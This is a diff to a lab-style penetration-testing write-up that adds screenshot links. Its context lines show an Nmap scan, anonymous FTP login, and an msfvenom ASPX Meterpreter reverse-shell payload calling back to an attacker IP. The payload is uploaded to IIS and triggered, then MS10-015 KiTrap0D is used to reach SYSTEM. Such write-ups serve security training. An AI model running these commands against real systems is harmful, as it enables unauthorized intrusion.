@@ -33,6 +33,11 @@ An initial Nmap scan was performed against the target system to identify exposed
 nmap -sV -sC -T4 10.129.167.91
 ```
 
+
+<img src="images/nmap.png" width="600">
+
+
+
 The scan revealed two exposed services:
 
 - FTP (`21/tcp`) running Microsoft FTP Service
@@ -56,6 +61,11 @@ Anonymous access to the FTP service was obtained using the `anonymous` account.
 ftp 10.129.167.91
 ```
 
+
+<img src="images/ftp.png" width="600">
+
+
+
 After successful authentication, the contents of the FTP server were enumerated:
 
 - `iisstart.htm`
@@ -75,11 +85,19 @@ A malicious ASPX reverse shell payload was generated using `msfvenom`:
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.17.83 LPORT=4444 -f aspx > shell.aspx
 ```
 
+<img src="images/msfvenom.png" width="600">
+
+
+
 The payload was uploaded to the FTP server through the anonymous FTP session:
 
 ```bash
 put shell.aspx
 ```
+
+<img src="images/shell.png" width="600">
+
+
 
 After confirming that the file was successfully uploaded, a Metasploit multi/handler listener was configured to receive the reverse Meterpreter connection.
 
@@ -91,13 +109,28 @@ set LPORT 4444
 run
 ```
 
+
+<img src="images/msf.png" width="600">
+
+
+
 The uploaded payload was then executed by accessing the following URL through the IIS web server:
 
 ```text
 http://10.129.167.91/shell.aspx
 ```
 
+
+<img src="images/shell-aspx.png" width="600">
+
+
+
 Once the ASPX payload was executed, a reverse Meterpreter session was established on the target system.
+
+
+<img src="images/meterpreter.png" width="600">
+
+
 
 Initial access was obtained under the following service account:
 
@@ -117,11 +150,17 @@ set SESSION 2
 run
 ```
 
+
 The enumeration results suggested that the target system was vulnerable to the following local privilege escalation exploit:
 
 ```text
 exploit/windows/local/ms10_015_kitrap0d
 ```
+
+
+<img src="images/suggester.png" width="600">
+
+
 
 The `local_exploit_suggester` module identified `MS10-015 KiTrap0D` as a viable privilege escalation vector based on the target operating system version and the presence of vulnerable system components.
 
@@ -136,7 +175,17 @@ set LPORT 5555
 run
 ```
 
+<img src="images/priv-esc.png" width="600">
+
+
+
+
 Successful exploitation resulted in a new Meterpreter session running with elevated privileges:
+
+
+<img src="images/system-shell.png" width="600">
+
+
 
 ```text
 NT AUTHORITY\SYSTEM
